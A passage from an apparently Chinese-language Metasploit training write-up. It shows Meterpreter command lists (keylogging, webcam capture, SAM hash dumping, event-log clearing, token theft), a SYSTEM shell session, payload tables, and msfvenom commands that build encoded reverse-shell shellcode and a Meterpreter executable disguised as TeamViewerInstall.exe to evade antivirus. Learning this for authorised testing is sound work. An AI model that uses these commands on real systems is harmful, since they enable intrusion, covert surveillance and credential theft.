quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    checksum      Retrieve the checksum of a file</span><br><span class="line">    cp            Copy source to destination</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    LCD           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    PWD           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    search        Search for files</span><br><span class="line">    show_mount    List all mount points/logical drives</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    arp           Display the host ARP cache</span><br><span class="line">    get proxy      Display the current proxy configuration</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    netstat       Display the network connections</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    resolve       Resolve a set of hostnames on the target</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: System Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    clearev       Clear the event log</span><br><span class="line">    drop_token    Relinquishes any active impersonation token.</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="line">    getsid        Get the SID of the user that the server is running as</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    kill          Terminate a process</span><br><span class="line">    localtime     Displays the target system&#x27;s local date and time</span><br><span class="line">    pgrep         Filter processes by name</span><br><span class="line">    pkill         Terminate processes by name</span><br><span class="line">    ps            List running processes</span><br><span class="line">    reboot        Reboots the remote computer</span><br><span class="line">    reg           Modify and interact with the remote registry</span><br><span class="line">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    shutdown      Shuts down the remote computer</span><br><span class="line">    steal_token   Attempts to steal an impersonation token from the target process</span><br><span class="line">    suspend       Suspends or resumes a list of processes</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: User interface Commands</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    enumdesktops   List all accessible desktops and window stations</span><br><span class="line">    getdesktop     Get the current meterpreter desktop</span><br><span class="line">    idle time       Returns the number of seconds the remote user has been idle</span><br><span class="line">    keyboard_send  Send keystrokes</span><br><span class="line">    keyevent       Send key events</span><br><span class="line">    keyscan_dump   Dump the keystroke buffer</span><br><span class="line">    keyscan_start  Start capturing keystrokes</span><br><span class="line">    keyscan_stop   Stop capturing keystrokes</span><br><span class="line">    mouse          Send mouse events</span><br><span class="line">    screenshare    Watch the remote user&#x27;s desktop in real-time</span><br><span class="line">    screenshot     Grab a screenshot of the interactive desktop</span><br><span class="line">    setdesktop     Change the meterpreters current desktop</span><br><span class="line">    uictl          Control some of the user interface components</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    record_mic     Record audio from the default microphone for X seconds</span><br><span class="line">    webcam_chat    Start a video chat</span><br><span class="line">    webcam_list    List webcams</span><br><span class="line">    webcam_snap    Take a snapshot from the specified webcam</span><br><span class="line">    webcam_stream  Play a video stream from the specified webcam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    get system     Attempt to elevate your privilege to that of the local system.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Password database Commands</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    hashdump      Dumps the contents of the SAM database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Timestamp Commands</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    timestamp     Manipulate file MACE attributes</span><br></pre></td></tr></table></figure><p>很漂亮。从从 SAM 中提取用户哈希值到截取屏幕截图和激活网络摄像头。所有这些都是通过 Linux 风格的命令行轻松完成的。进一步探索，我们还看到了打开 shell 通道的选项。这将使我们进入实际的 Windows 命令行界面。</p><h4 id="MSF-Meterpreter-导航"><a href="#MSF-Meterpreter-导航" class="headerlink" title="MSF - Meterpreter 导航"></a>MSF - Meterpreter 导航</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cd Users</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Users</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator</span><br><span class="line">40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users</span><br><span class="line">40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default</span><br><span class="line">40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User</span><br><span class="line">40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public</span><br><span class="line">100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">Process 2664 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users&gt;</span><br></pre></td></tr></table></figure><p><code>Channel 1</code>已创建，我们将自动放入此机器的 CLI 中。这里的通道表示我们的设备和目标主机之间的连接，它已经使用 Meterpreter Stager 和 Stage 在反向 TCP 连接（从目标主机到我们）中建立。stager 在我们的机器上被激活，以等待由目标机器上的 Stage 有效负载初始化的连接请求。</p><p>在某些情况下，进入目标的标准 shell 是有帮助的，但 Meterpreter 也可以在受害机器上导航和执行操作。所以我们看到命令发生了变化，但我们在系统内具有相同的权限级别。</p><h4 id="MSF-Windows-CMD"><a href="#MSF-Windows-CMD" class="headerlink" title="MSF-Windows CMD"></a>MSF-Windows CMD</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users&gt;dir</span><br><span class="line"></span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is A0EF-1911</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users</span><br><span class="line"></span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          .</span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          ..</span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          Administrator</span><br><span class="line">14/07/2017  14:45    &lt;DIR&gt;          haris</span><br><span class="line">12/04/2011  08:51    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               5 Dir(s)  15,738,978,304 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users&gt;whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>让我们看看我们可以使用哪些其他类型的有效载荷。我们将研究与 Windows 操作系统相关的最常见的问题。</p><h2 id="有效载荷类型"><a href="#有效载荷类型" class="headerlink" title="有效载荷类型"></a>有效载荷类型</h2><p>下表包含用于 Windows 机器的最常见有效负载及其各自的描述。</p><table><thead><tr><th><strong>有效载荷</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>generic/custom</code></td><td>通用监听器，多用途</td></tr><tr><td><code>generic/shell_bind_tcp</code></td><td>通用监听器，多用途，普通 shell，TCP 连接绑定</td></tr><tr><td><code>generic/shell_reverse_tcp</code></td><td>通用侦听器，多用途，普通外壳，反向 TCP 连接</td></tr><tr><td><code>windows/x64/exec</code></td><td>执行任意命令 (Windows x64)</td></tr><tr><td><code>windows/x64/loadlibrary</code></td><td>加载任意 x64 库路径</td></tr><tr><td><code>windows/x64/messagebox</code></td><td>使用可自定义的标题、文本和图标通过 MessageBox 生成一个对话框</td></tr><tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>普通 shell，单一负载，反向 TCP 连接</td></tr><tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>普通shell，stager + stage，反向TCP连接</td></tr><tr><td><code>windows/x64/shell/bind_ipv6_tcp</code></td><td>普通外壳，stager + stage，IPv6 Bind TCP stager</td></tr><tr><td><code>windows/x64/meterpreter/$</code></td><td>Meterpreter payload + 以上变体</td></tr><tr><td><code>windows/x64/powershell/$</code></td><td>交互式 PowerShell 会话 + 以上品种</td></tr><tr><td><code>windows/x64/vncinject/$</code></td><td>VNC 服务器（反射注入）+ 以上品种</td></tr></tbody></table><p>渗透测试人员在安全评估期间大量使用的其他关键有效载荷是 Empire 和 Cobalt Strike 有效载荷。这些不在本课程的范围内，但您可以在我们的空闲时间随意研究它们，因为它们可以提供大量关于专业渗透测试人员如何对高价值目标进行评估的见解。</p><p>当然，除了这些之外，还有许多其他有效载荷。有些是针对特定设备供应商的，例如 Cisco、Apple 或 PLC。有些我们可以使用<code>msfvenom</code>. 然而，接下来，我们将研究<code>Targets</code>以及如何使用它们来影响攻击结果。</p><h1 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h1><hr><p>在 Metasploit 框架存在的 15 年中，<code>Encoders</code>它帮助使有效负载与不同的处理器架构兼容，同时帮助逃避防病毒。<code>Encoders</code>发挥改变有效载荷以在不同操作系统和体系结构上运行的作用。这些架构包括：</p><table><thead><tr><th><code>x64</code></th><th><code>x86</code></th><th><code>sparc</code></th><th><code>ppc</code></th><th><code>mips</code></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><code>bad characters</code>还需要它们从有效负载中删除已知的十六进制操作码。不仅如此，以不同格式编码有效载荷也有助于如上所述的反病毒检测。然而，随着 IPS&#x2F;IDS 制造商改进了他们的保护软件处理恶意软件和病毒签名的方式，严格用于 AV 规避的编码器的使用随着时间的推移已经减少。</p><p>Shikata Ga Nai ( <code>SGN</code>) 是当今最常用的编码方案之一，因为它很难检测到通过其机制编码的有效载荷不再普遍无法检测到。离得很远。名称 ( <code>仕方がない</code>) 的意思是<code>It cannot be helped</code>or <code>Nothing can be done about it</code>，如果我们几年前读到这篇文章的话，这是理所当然的。但是，我们将探索其他方法来规避保护系统。<a href="https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html">来自 FireEye 的这篇文章</a>详细介绍了 Shikata Ga Nai 之前统治其他编码器的原因和方式。</p><hr><h2 id="选择编码器"><a href="#选择编码器" class="headerlink" title="选择编码器"></a>选择编码器</h2><p>在 2015 年之前，Metasploit 框架有不同的子模块来处理负载和编码器。它们与 msfconsole 脚本分开打包，并称为<code>msfpayload</code>and <code>msfencode</code>。这两个工具位于<code>/usr/share/framework2/</code>.</p><p>如果我们想创建我们的自定义负载，我们可以通过 来实现<code>msfpayload</code>，但我们必须根据目标操作系统架构对其进行编码，<code>msfencode</code>然后再使用。管道将从一个命令获取输出并将其馈送到下一个命令，这将生成一个编码的有效负载，准备好发送并在目标机器上运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b &#x27;\x00&#x27; -f perl -e x86/shikata_ga_nai</span><br><span class="line"></span><br><span class="line">[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)</span><br><span class="line"></span><br><span class="line">my $buf = </span><br><span class="line">&quot;\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9&quot; .</span><br><span class="line">&quot;\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2&quot; .</span><br><span class="line">&quot;\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd&quot; .</span><br><span class="line">&quot;\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6&quot; .</span><br><span class="line">&quot;\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36&quot; .</span><br><span class="line">&quot;\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45&quot; .</span><br><span class="line">&quot;\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc&quot; .</span><br><span class="line">&quot;\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a&quot; .</span><br><span class="line">&quot;\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9&quot; .</span><br><span class="line">&quot;\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde&quot; .</span><br><span class="line">&quot;\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f&quot; .</span><br><span class="line">&quot;\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7&quot; .</span><br><span class="line">&quot;\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9&quot; .</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>2015 年之后，这些脚本的更新已将它们合并到<code>msfvenom</code>工具中，该工具负责有效负载生成和编码。<code>msfvenom</code>后面我们会详细讲到。下面是今天的有效负载生成的示例<code>msfvenom</code>：</p><h4 id="生成有效载荷-无编码"><a href="#生成有效载荷-无编码" class="headerlink" title="生成有效载荷 - 无编码"></a>生成有效载荷 - 无编码</h4><p> 生成有效载荷 - 无编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &quot;\x00&quot; -f perl</span><br><span class="line"></span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 381 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 381</span><br><span class="line">Payload size: 381 bytes</span><br><span class="line">Final size of perl file: 1674 bytes</span><br><span class="line">my $buf = </span><br><span class="line">&quot;\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9&quot; .</span><br><span class="line">&quot;\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37&quot; .</span><br><span class="line">&quot;\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1&quot; .</span><br><span class="line">&quot;\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91&quot; .</span><br><span class="line">&quot;\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31&quot; .</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>我们现在应该看一下的第一行<code>$buf</code>，看看它在应用像 . 这样的编码器时是如何变化的<code>shikata_ga_nai</code>。</p><h4 id="生成有效载荷-使用编码"><a href="#生成有效载荷-使用编码" class="headerlink" title="生成有效载荷 - 使用编码"></a>生成有效载荷 - 使用编码</h4><p> 生成有效载荷 - 使用编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &quot;\x00&quot; -f perl -e x86/shikata_ga_nai</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 3 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 326 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 353 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 380 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 380</span><br><span class="line">Payload size: 380 bytes</span><br><span class="line">buf = &quot;&quot;</span><br><span class="line">buf += &quot;\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31&quot;</span><br><span class="line">buf += &quot;\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32&quot;</span><br><span class="line">buf += &quot;\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94&quot;</span><br><span class="line">buf += &quot;\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e&quot;</span><br><span class="line">buf += &quot;\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e&quot;</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>如果我们想查看<code>shikata_ga_nai</code>编码器的功能，我们可以查看<a href="https://hatching.io/blog/metasploit-payloads2/">此处的</a>精彩帖子。</p><p>假设我们要为<code>existing payload</code>. 然后，我们可以使用<code>show encoders</code>中的命令<code>msfconsole</code>来查看哪些编码器可用于我们当前的<code>Exploit module + Payload</code>组合。</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15</span><br><span class="line"></span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show encoders</span><br><span class="line"></span><br><span class="line">Compatible Encoders</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   #  Name              Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----              ---------------  ----    -----  -----------</span><br><span class="line">   0  generic/eicar                      manual  No     The EICAR Encoder</span><br><span class="line">   1  generic/none                       manual  No     The &quot;none&quot; Encoder</span><br><span class="line">   2  x64/xor                            manual  No     XOR Encoder</span><br><span class="line">   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder</span><br><span class="line">   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru</span><br></pre></td></tr></table></figure><p>在前面的例子中，我们只看到了一些适合 x64 系统的编码器。与可用的 payload 一样，这些都是根据 Exploit 模块自动过滤的，只显示兼容的。例如，让我们试试<code>MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit</code>.</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(ms09_050_smb2_negotiate_func_index) &gt; show encoders</span><br><span class="line"></span><br><span class="line">Compatible Encoders</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   Name                    Disclosure Date  Rank       Description</span><br><span class="line">   ----                    ---------------  ----       -----------</span><br><span class="line">   generic/none                             normal     The &quot;none&quot; Encoder</span><br><span class="line">   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower</span><br><span class="line">   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder</span><br><span class="line">   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder</span><br><span class="line">   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">   x86/countdown                            normal     Single-byte XOR Countdown Encoder</span><br><span class="line">   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">   x86/nonalpha                             low        Non-Alpha Encoder</span><br><span class="line">   x86/nonupper                             low        Non-Upper Encoder</span><br><span class="line">   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">   x86/single_static_bit                    manual     Single Static Bit</span><br><span class="line">   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure><p>就拿上面的例子来说吧——一个假设的例子。如果我们只使用 SGN 对可执行负载进行一次编码，那么它很可能会被当今的大多数防病毒软件检测到。让我们深入研究一下。拿起处理<code>msfvenom</code>有效载荷生成和编码方案的框架的下标，我们有以下输入：</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 368</span><br><span class="line">Payload size: 368 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: TeamViewerInstall.exe</span><br></pre></td></tr></table></figure><p>这将生成一个<code>exe</code>格式为 TeamViewerInstall.exe 的有效负载，该格式适用于 Windows 平台的 x86 架构处理器，具有隐藏的 Meterpreter reverse_tcp shell 有效负载，使用 Shikata Ga Nai 方案编码一次。让我们把结果上传到 VirusTotal。</p><p>一个更好的选择是尝试通过相同编码方案的多次迭代来运行它：</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 10 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 395 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 422 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 449 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 476 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 503 (iteration=5)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 530 (iteration=6)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 557 (iteration=7)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 584 (iteration=8)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 611 (iteration=9)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 611</span><br><span class="line">Payload size: 611 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe</span><br></pre></td></tr></table></figure><p>正如我们所看到的，这仍然不足以进行 AV 规避。仍有大量产品可以检测有效负载。或者，Metasploit 提供了一个工具<code>msf-virustotal</code>，我们可以使用它和 API 密钥来分析我们的有效载荷。但是，这需要在 VirusTotal 上免费注册。</p><h4 id="无国界医生-VirusTotal"><a href="#无国界医生-VirusTotal" class="headerlink" title="无国界医生 - 